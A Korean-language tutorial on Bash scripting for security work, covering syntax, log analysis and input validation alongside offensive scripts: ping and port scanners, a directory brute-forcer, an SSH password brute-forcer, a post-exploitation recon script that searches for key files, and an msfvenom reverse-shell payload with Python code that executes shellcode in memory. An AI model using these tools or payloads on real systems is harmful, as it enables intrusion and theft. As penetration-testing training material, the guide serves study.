# Bash 스크립팅 — 보안 자동화 실전 가이드

## 1. 기본 문법

### 변수
```bash
#!/bin/bash
name="hacker"
echo "Hello, $name"
echo "Hello, ${name}!"

# 명령어 결과를 변수에 저장
ip_addr=$(hostname -I | awk '{print $1}')
echo "My IP: $ip_addr"

# 산술 연산
x=10
y=3
echo $((x + y))     # 13
echo $((x * y))     # 30
echo $((x / y))     # 3 (정수 나눗셈)
echo $((x % y))     # 1
```

### 조건문
```bash
#!/bin/bash

# 파일 존재 확인
if [ -f "/etc/passwd" ]; then
    echo "파일 존재"
fi

# 문자열 비교
user="root"
if [ "$user" = "root" ]; then
    echo "루트 계정"
elif [ "$user" = "admin" ]; then
    echo "관리자 계정"
else
    echo "일반 계정"
fi

# 숫자 비교
port=22
if [ $port -eq 22 ]; then
    echo "SSH 포트"
elif [ $port -lt 1024 ]; then
    echo "Well-known port"
fi

# 파일/디렉토리 조건
[ -f file ]    # 파일 존재
[ -d dir ]     # 디렉토리 존재
[ -r file ]    # 읽기 가능
[ -w file ]    # 쓰기 가능
[ -x file ]    # 실행 가능
[ -s file ]    # 파일 크기가 0보다 큼
[ -L file ]    # 심볼릭 링크
```

### 반복문
```bash
#!/bin/bash

# for 루프 — IP 대역 스캔
for i in {1..254}; do
    ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is UP"
done

# for 루프 — 파일 목록
for file in /var/log/*.log; do
    echo "Processing: $file"
    wc -l "$file"
done

# while 루프
count=0
while [ $count -lt 10 ]; do
    echo "Count: $count"
    ((count++))
done

# 파일 한 줄씩 읽기
while IFS= read -r line; do
    echo "Line: $line"
done < wordlist.txt
```

### 함수
```bash
#!/bin/bash

# 함수 정의
check_port() {
    local host=$1
    local port=$2
    timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[OPEN]  $host:$port"
    else
        echo "[CLOSE] $host:$port"
    fi
}

# 함수 호출
check_port 192.168.1.1 22
check_port 192.168.1.1 80
check_port 192.168.1.1 443
```

---

## 2. 보안 자동화 스크립트 모음

### 2-1. 호스트 탐지 스캐너
```bash
#!/bin/bash
# 네트워크 내 활성 호스트 탐지

NETWORK="192.168.1"
ALIVE_HOSTS=()

echo "[*] Scanning network: $NETWORK.0/24"
echo "================================================"

for i in $(seq 1 254); do
    ip="$NETWORK.$i"
    if ping -c 1 -W 1 "$ip" &>/dev/null; then
        echo "[+] $ip is ALIVE"
        ALIVE_HOSTS+=("$ip")
    fi
done

echo ""
echo "[*] Scan Complete. ${#ALIVE_HOSTS[@]} hosts found."
for host in "${ALIVE_HOSTS[@]}"; do
    echo "    → $host"
done
```

### 2-2. 포트 스캐너 (Bash 기반)
```bash
#!/bin/bash
# TCP 포트 스캔 (Bash /dev/tcp 활용)

HOST=${1:-"192.168.1.1"}
START_PORT=${2:-1}
END_PORT=${3:-1024}

echo "[*] Scanning $HOST ports $START_PORT-$END_PORT"
echo "================================================"

for port in $(seq $START_PORT $END_PORT); do
    (echo >/dev/tcp/$HOST/$port) 2>/dev/null && echo "[OPEN] Port $port"
done
```

### 2-3. 웹 디렉토리 브루트포서
```bash
#!/bin/bash
# HTTP 디렉토리 열거

TARGET=${1:-"http://localhost"}
WORDLIST=${2:-"/usr/share/dirb/wordlists/common.txt"}

echo "[*] Target: $TARGET"
echo "[*] Wordlist: $WORDLIST"
echo "================================================"

while IFS= read -r dir; do
    url="$TARGET/$dir"
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url")
    
    case $status in
        200) echo "[200 OK]       $url" ;;
        301|302) echo "[${status} REDIR]  $url" ;;
        403) echo "[403 FORBID]   $url" ;;
        500) echo "[500 ERROR]    $url" ;;
    esac
done < "$WORDLIST"
```

### 2-4. SSH 브루트포서 (학습용)
```bash
#!/bin/bash
# SSH 비밀번호 대입 공격 (허가된 시스템에서만 사용)

HOST=$1
USER=$2
WORDLIST=$3

if [ -z "$HOST" ] || [ -z "$USER" ] || [ -z "$WORDLIST" ]; then
    echo "Usage: $0 <host> <user> <wordlist>"
    exit 1
fi

echo "[*] Target: $USER@$HOST"
echo "================================================"

while IFS= read -r password; do
    result=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
             -o ConnectTimeout=3 "$USER@$HOST" "echo SUCCESS" 2>/dev/null)
    
    if [ "$result" = "SUCCESS" ]; then
        echo "[+] SUCCESS! Password: $password"
        exit 0
    else
        echo "[-] Failed: $password"
    fi
done < "$WORDLIST"

echo "[-] Attack finished. Password not found."
```

### 2-5. 로그 분석 자동화
```bash
#!/bin/bash
# auth.log 분석 — 공격 IP 탐지

LOG_FILE="/var/log/auth.log"
THRESHOLD=10  # 10번 이상 실패한 IP를 공격자로 간주

echo "[*] SSH Brute Force Detection Report"
echo "======================================"
echo ""
echo "[*] Top Attacking IPs:"
grep "Failed password" "$LOG_FILE" 2>/dev/null | \
    grep -oP 'from \K[\d.]+' | \
    sort | \
    uniq -c | \
    sort -rn | \
    while read count ip; do
        if [ $count -ge $THRESHOLD ]; then
            echo "  [!] $ip — $count attempts (POTENTIAL ATTACKER)"
        else
            echo "  [-] $ip — $count attempts"
        fi
    done

echo ""
echo "[*] Successful Logins:"
grep "Accepted" "$LOG_FILE" 2>/dev/null | \
    grep -oP 'for \K\S+ from \K[\d.]+' | \
    sort | uniq -c | sort -rn
```

### 2-6. 시스템 정보 수집 (내부 침투 후)
```bash
#!/bin/bash
# Post-exploitation 내부 정찰 스크립트

echo "=========================================="
echo "  SYSTEM RECONNAISSANCE REPORT"
echo "=========================================="

echo ""
echo "[*] System Information"
echo "  Hostname   : $(hostname)"
echo "  OS         : $(cat /etc/os-release | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '"')"
echo "  Kernel     : $(uname -r)"
echo "  Arch       : $(uname -m)"

echo ""
echo "[*] Current User"
echo "  User  : $(whoami)"
echo "  UID   : $(id -u)"
echo "  Groups: $(id -Gn)"

echo ""
echo "[*] Sudo Privileges"
sudo -l 2>/dev/null | grep -v "^[[:space:]]*$"

echo ""
echo "[*] Active Network Connections"
ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null

echo ""
echo "[*] SetUID Files"
find / -perm -4000 -type f 2>/dev/null

echo ""
echo "[*] Writable Directories"
find /tmp /var/tmp /dev/shm -writable -type d 2>/dev/null

echo ""
echo "[*] Cron Jobs"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null

echo ""
echo "[*] Running Processes (Root)"
ps aux | grep root | grep -v grep

echo ""
echo "[*] Interesting Files"
find /home -name "*.txt" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find /var/www -name "*.php" -o -name "*.conf" 2>/dev/null | head -20
```

---

## 3. 정규 표현식 (Regex) 보안 활용

```bash
# IP 주소 추출
grep -oP '\b\d{1,3}(\.\d{1,3}){3}\b' file.txt

# 이메일 주소 추출
grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' file.txt

# URL 추출
grep -oP 'https?://[^\s<>"]+' file.txt

# Base64 인코딩 문자열 탐지
grep -oP '[A-Za-z0-9+/]{20,}={0,2}' file.txt

# 숫자만 추출
grep -oP '\d+' file.txt

# 16진수 패턴 (셸코드 등)
grep -oP '\\x[0-9a-fA-F]{2}' shellcode.txt
```

---

## 4. 프로세스 관리 및 백그라운드 실행

```bash
# 백그라운드 실행
long_scan.sh &
echo "PID: $!"

# 백그라운드 프로세스 목록
jobs

# 포그라운드로 가져오기
fg %1

# nohup으로 터미널 종료 후에도 실행
nohup ./scan.sh > output.log 2>&1 &

# screen으로 세션 유지
screen -S hacking_session
# Ctrl+A, D 로 분리
screen -r hacking_session  # 재연결

# tmux 활용
tmux new -s attack
# Ctrl+B, D 로 분리
tmux attach -t attack
```

---

## 5. 고급 Bash 기법

### 에러 처리
```bash
#!/bin/bash
set -e          # 오류 발생 시 즉시 종료
set -u          # 정의되지 않은 변수 사용 시 오류
set -o pipefail  # 파이프라인 오류 전파

# 트랩으로 종료 시 정리
cleanup() {
    echo "[*] Cleaning up..."
    rm -f /tmp/scan_*.txt
}
trap cleanup EXIT
```

### 병렬 처리
```bash
#!/bin/bash
# 병렬 포트 스캔 (훨씬 빠름)

NETWORK="192.168.1"

scan_host() {
    local ip="$NETWORK.$1"
    ping -c 1 -W 1 "$ip" &>/dev/null && echo "$ip is ALIVE"
}

export -f scan_host
export NETWORK

# xargs를 활용한 병렬 실행 (최대 50개 동시)
seq 1 254 | xargs -P 50 -I {} bash -c 'scan_host "$@"' _ {}
```

---

## 6. Base64 인코딩/디코딩 (보안 분석)

### 기본 사용법
```bash
# 인코딩
echo -n "Hello World" | base64
# 출력: SGVsbG8gV29ybGQ=

# 디코딩
echo "SGVsbG8gV29ybGQ=" | base64 -d
# 출력: Hello World

# 파일 인코딩
base64 binary_file > encoded.txt

# 파일 디코딩
base64 -d encoded.txt > decoded_file
```

### 보안 분석 활용
```bash
# 악성코드에서 Base64 인코딩 문자열 추출 및 디코딩
grep -oP '[A-Za-z0-9+/]{20,}={0,2}' suspicious_file.txt | \
    while read b64; do
        decoded=$(echo "$b64" | base64 -d 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo "=== Decoded ==="
            echo "$decoded"
        fi
    done

# URL에서 Base64 추출 (URL-safe 변형 처리)
echo "aHR0cDovL2V4YW1wbGUuY29t" | base64 -d
# 출력: http://example.com

# PowerShell 악성코드 디코딩 (EncodedCommand)
# powershell -enc <Base64>
echo "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=" | \
    base64 -d | iconv -f UTF-16LE -t UTF-8

# Python으로 Base64 처리
python3 -c "import base64; print(base64.b64decode('SGVsbG8gV29ybGQ=').decode())"

# base64 인코딩 변형 탐지
# Standard: A-Z, a-z, 0-9, +, /
# URL-safe:  A-Z, a-z, 0-9, -, _
echo "SGVsbG8-V29ybGQ_" | tr '-_' '+/' | base64 -d
```

### 쉘코드 Base64 인코딩 (실습용)
```bash
# msfvenom으로 생성한 쉘코드 인코딩
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f raw | base64 | tr -d '\n'

# 디코딩 후 실행 (Python)
python3 -c "
import base64
sc = base64.b64decode('BASE64_SHELLCODE')
# 메모리에서 실행 (ctypes 방식)
import ctypes
buf = ctypes.create_string_buffer(sc)
ctypes.cast(buf, ctypes.CFUNCTYPE(None))()
"
```

---

## 7. 스크립트 입력 검증 및 보안 코딩

### 입력 검증
```bash
#!/bin/bash
# 안전한 입력 검증

validate_ip() {
    local ip=$1
    local stat=1
    
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 && \
           ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        stat=$?
    fi
    return $stat
}

# IP 유효성 확인
TARGET_IP="$1"
if ! validate_ip "$TARGET_IP"; then
    echo "[!] 잘못된 IP 주소: $TARGET_IP"
    exit 1
fi

validate_port() {
    local port=$1
    [[ "$port" =~ ^[0-9]+$ ]] && [ "$port" -ge 1 ] && [ "$port" -le 65535 ]
}
```

### 안전한 임시 파일 처리
```bash
#!/bin/bash
# 안전한 임시 파일 생성 및 정리

# mktemp으로 안전한 임시 파일 생성
TMPFILE=$(mktemp /tmp/scan_XXXXXX.txt)
TMPDIR=$(mktemp -d /tmp/output_XXXXXX)

# 종료 시 자동 정리 (인터럽트 포함)
cleanup() {
    rm -f "$TMPFILE"
    rm -rf "$TMPDIR"
    echo "[*] 임시 파일 정리 완료"
}
trap cleanup EXIT INT TERM

# 작업 수행
nmap -sV TARGET_IP > "$TMPFILE"
cp "$TMPFILE" "$TMPDIR/nmap_result.txt"

echo "[+] 스캔 완료: $TMPDIR/nmap_result.txt"
```

### 로깅 기능 포함 스크립트
```bash
#!/bin/bash
# 로깅이 포함된 스크립트 템플릿

LOG_FILE="/var/log/pentest_$(date +%Y%m%d).log"
TARGET="$1"

log() {
    local level=$1
    shift
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $*" | tee -a "$LOG_FILE"
}

log "INFO" "스크립트 시작: $0 $*"
log "INFO" "대상 호스트: $TARGET"

# 실행 예시
if nmap -sV "$TARGET" >> "$LOG_FILE" 2>&1; then
    log "SUCCESS" "Nmap 스캔 완료"
else
    log "ERROR" "Nmap 스캔 실패"
    exit 1
fi

log "INFO" "스크립트 종료"
```
